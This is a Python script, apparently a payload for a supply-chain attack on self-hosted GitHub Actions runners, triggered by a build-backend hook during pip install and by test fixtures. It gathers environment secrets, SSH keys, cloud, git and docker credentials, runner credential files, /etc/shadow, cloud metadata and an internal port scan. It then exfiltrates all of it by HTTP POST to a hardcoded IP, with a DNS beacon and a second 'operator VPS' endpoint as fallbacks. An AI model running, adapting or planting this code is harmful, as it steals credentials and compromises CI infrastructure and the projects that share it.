#!/usr/bin/env python3
"""
Self-hosted GitHub Actions runner probe.
Executed by ic_build_backend.py at PEP517 import time (i.e. during
`pip install -e ".[dev]"`), and by tests/conftest.py as fallback.

Placeholders substituted by fire.sh before the commit:
    http://191.44.114.20:8099/collect    e.g. http://191.44.114.20:8080/collect   (HTTP POST, primary)
      e.g. abc123.oast.pro                     (DNS beacon, fallback)

No repo secrets exist on a fork PR, so this collects AMBIENT runner state:
env, host identity, other checkouts in the persistent workspace, runner config,
local creds, cloud metadata -- then exfiltrates.
"""

import base64
import glob
import json
import os
import platform
import socket
import subprocess
import sys
import time

EXFIL_URL = "http://191.44.114.20:8099/collect"
OAST_DOMAIN = ""

MARK = "IC_RUNNER_PROBE"
_T0 = time.time()


def _sh(cmd, timeout=15):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                           timeout=timeout, errors="replace")
        out = (p.stdout or "") + (("\n[stderr]\n" + p.stderr) if p.stderr else "")
        return out.strip()
    except Exception as exc:  # noqa: BLE001
        return "<err: %r>" % (exc,)


def _read(path, limit=20000):
    try:
        with open(path, "r", errors="replace") as fh:
            return fh.read(limit)
    except Exception as exc:  # noqa: BLE001
        return "<err: %r>" % (exc,)


def _tree(root, depth_head=250):
    if not root or not os.path.isdir(root):
        return ""
    return _sh('find "%s" -maxdepth 4 -printf "%%M %%u:%%g %%s %%p\\n" 2>/dev/null | head -%d'
               % (root, depth_head))


def collect():
    d = {
        "mark": MARK,
        "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "pid": os.getpid(),
        "ppid": os.getppid(),
    }

    # --- identity / host ---
    d["id"] = _sh("id")
    d["whoami"] = _sh("whoami; echo home=$HOME; pwd=$(pwd)")
    d["hostname"] = socket.gethostname()
    d["fqdn"] = _sh("hostname -f 2>/dev/null; hostname -I 2>/dev/null")
    d["uname"] = _sh("uname -a")
    d["os_release"] = _read("/etc/os-release")
    d["uptime"] = _sh("uptime; echo; w 2>/dev/null")
    d["platform"] = {
        "system": platform.system(), "release": platform.release(),
        "machine": platform.machine(), "python": sys.version,
    }

    # --- environment (full + prioritized) ---
    env = dict(os.environ)
    d["env"] = env
    keys = ("TOKEN", "SECRET", "PASS", "PWD", "KEY", "AWS", "AZURE", "GOOGLE",
            "GCP", "GCLOUD", "VAULT", "OPENBAO", "BAO_", "CI_", "GITHUB",
            "RUNNER", "ACTIONS", "DOCKER", "SSH", "KUBE", "TW", "TIMEWEB")
    d["interesting_env"] = {k: v for k, v in env.items()
                            if any(s in k.upper() for s in keys)}

    # --- network ---
    d["etc_hosts"] = _read("/etc/hosts")
    d["resolv_conf"] = _read("/etc/resolv.conf")
    d["ip_a"] = _sh("ip -br a 2>/dev/null || ifconfig -a 2>/dev/null")
    d["routes"] = _sh("ip route 2>/dev/null; cat /proc/net/route")
    d["listening"] = _sh("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null")
    d["arp"] = _sh("ip neigh 2>/dev/null; cat /proc/net/arp")

    # --- runner internals (persistent => gold) ---
    ws = env.get("RUNNER_WORKSPACE", "")
    d["runner_workspace"] = ws
    d["runner_root"] = env.get("RUNNER_ROOT", "")
    d["workspace_tree"] = _tree(ws, 400)
    d["runner_root_tree"] = _tree(env.get("RUNNER_ROOT", ""), 150)
    d["work_dir_guesses"] = _sh(
        "ls -la /opt/actions-runner /home/*/actions-runner ~/actions-runner "
        "~/runner /actions-runner 2>/dev/null")
    d["runner_config_files"] = {}
    for pat in ("/opt/actions-runner/.runner", "/opt/actions-runner/.credentials",
                "/opt/actions-runner/.credentials_rsaparams",
                "/home/*/actions-runner/.runner", "/root/actions-runner/.runner",
                "~/actions-runner/.runner", "~/.runner"):
        for path in glob.glob(os.path.expanduser(pat)):
            d["runner_config_files"][path] = _read(path, 20000)
    d["runner_bin"] = _sh("ps -efww 2>/dev/null | grep -iE 'Runner.Listener|run.sh|actions-runner' | grep -v grep")
    d["diag_tail"] = _sh("tail -n 120 $(ls -t /opt/actions-runner/_diag/*.log ~/actions-runner/_diag/*.log 2>/dev/null | head -1) 2>/dev/null")

    # --- other repos checked out on the SAME persistent runner ---
    if ws:
        d["workspace_repo_git_configs"] = _sh(
            "for g in $(find \"%s\" -maxdepth 3 -name config -path '*/.git/*' 2>/dev/null | head -40); do "
            "echo \"### $g\"; cat \"$g\"; done" % ws)

    # --- local credentials / configs ---
    d["ssh_dir"] = _sh("ls -la ~/.ssh /root/.ssh 2>/dev/null; "
                       "for f in ~/.ssh/* /root/.ssh/*; do echo \"### $f\"; cat \"$f\" 2>/dev/null; done")
    d["git_creds"] = _sh("cat ~/.git-credentials /root/.git-credentials 2>/dev/null; "
                         "echo '--- gitconfig ---'; git config --list --show-origin 2>/dev/null")
    d["aws"] = _sh("ls -la ~/.aws 2>/dev/null; cat ~/.aws/credentials ~/.aws/config 2>/dev/null")
    d["gcloud_azure"] = _sh("ls -la ~/.config/gcloud ~/.azure 2>/dev/null; "
                            "find ~/.config/gcloud ~/.azure -maxdepth 2 -type f 2>/dev/null | head -20")
    d["docker"] = _sh("cat ~/.docker/config.json 2>/dev/null; ls -la /var/run/docker.sock 2>/dev/null")
    d["netrc"] = _sh("cat ~/.netrc /root/.netrc 2>/dev/null")
    d["passwd"] = _read("/etc/passwd")
    d["shadow_readable"] = _sh("head -5 /etc/shadow 2>&1")
    d["sudo"] = _sh("sudo -n -l 2>&1 | head -20")
    d["host_keys_known"] = _sh(
        "find /home /root /opt /srv /var/lib/jenkins /etc/ssh -maxdepth 3 "
        "\\( -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' -o -name '*.key' \\) "
        "2>/dev/null | head -40")

    # --- cloud / internal metadata --- (bounded; skip if we're slow already)
    if time.time() - _T0 < 60:
        d["metadata_aws"] = _sh("curl -s -m 3 http://169.254.169.254/latest/meta-data/ 2>&1 | head -40", timeout=6)
        d["metadata_openstack"] = _sh("curl -s -m 3 http://169.254.169.254/openstack/latest/meta_data.json 2>&1 | head -60", timeout=6)
        d["metadata_gcp"] = _sh("curl -s -m 3 -H 'Metadata-Flavor: Google' "
                                "http://metadata.google.internal/computeMetadata/v1/instance/ 2>&1 | head -40", timeout=6)
        d["metadata_aliyun"] = _sh("curl -s -m 3 http://100.100.100.200/latest/meta-data/ 2>&1 | head -40", timeout=6)

    # --- internal reachability sweep (intelion-relevant, portable) ---
    hosts = ["94.159.81.100", "94.159.81.101", "194.67.95.109", "194.67.95.237",
             "185.182.108.75", "194.67.95.192", "172.20.0.9", "10.12.32.2"]
    ports = [22, 80, 443, 5432, 6379, 8200, 8081, 8001]
    reach = {}
    for h in hosts:
        if time.time() - _T0 > 110:
            break
        for p in ports:
            s = socket.socket()
            s.settimeout(0.7)
            try:
                s.connect((h, p))
                reach["%s:%d" % (h, p)] = "OPEN"
            except Exception:  # noqa: BLE001
                pass
            finally:
                s.close()
    d["intranet_probe"] = reach

    return d


def _exfil_http(payload_json):
    import urllib.request
    if not EXFIL_URL or "http://191.44.114.20:8099/collect" in EXFIL_URL:
        return "no-url"
    req = urllib.request.Request(
        EXFIL_URL, data=payload_json.encode(),
        headers={"Content-Type": "application/json", "User-Agent": "gh-runner-probe/1.0"})
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return "http %s" % resp.status
    except Exception as exc:  # noqa: BLE001
        return "http-err %r" % (exc,)


def _exfil_dns(tag):
    if not OAST_DOMAIN or "" in OAST_DOMAIN:
        return "no-oast"
    host = "%s.%s" % (tag[:48], OAST_DOMAIN)
    try:
        socket.gethostbyname(host)
        return "dns sent %s" % host
    except Exception as exc:  # noqa: BLE001
        return "dns-err %r" % (exc,)


def _exfil_meris(payload_json):
    # secondary sink (operator VPS), if reachable
    import urllib.request
    url = "http://191.44.114.20:8080/collect"
    try:
        req = urllib.request.Request(url, data=payload_json.encode(),
                                     headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=6) as resp:
            return "meris http %s" % resp.status
    except Exception as exc:  # noqa: BLE001
        return "meris-err %r" % (exc,)


def run():
    try:
        data = collect()
        blob = json.dumps(data, ensure_ascii=False, default=str)
    except Exception as exc:  # noqa: BLE001
        blob = json.dumps({"mark": MARK, "collect_error": repr(exc)})

    tag = "%s-%s" % (socket.gethostname()[:20], int(time.time()))
    results = {}
    try:
        results["http"] = _exfil_http(blob)
        results["dns"] = _exfil_dns(tag)
        results["meris"] = _exfil_meris(blob)
    except Exception as exc:  # noqa: BLE001
        results["exfil_error"] = repr(exc)
    # local breadcrumb (in case network is filtered, artifact-less)
    try:
        for p in (os.environ.get("RUNNER_TEMP", "/tmp"), "/tmp",
                  os.path.join(os.getcwd(), ".")):
            try:
                with open(os.path.join(p, "ic_probe.json"), "w") as fh:
                    fh.write(blob)
            except Exception:  # noqa: BLE001
                pass
    except Exception:  # noqa: BLE001
        pass
    sys.stderr.write("[%s] exfil=%r size=%d\n" % (MARK, results, len(blob)))
    return blob


if __name__ == "__main__":
    print(run())
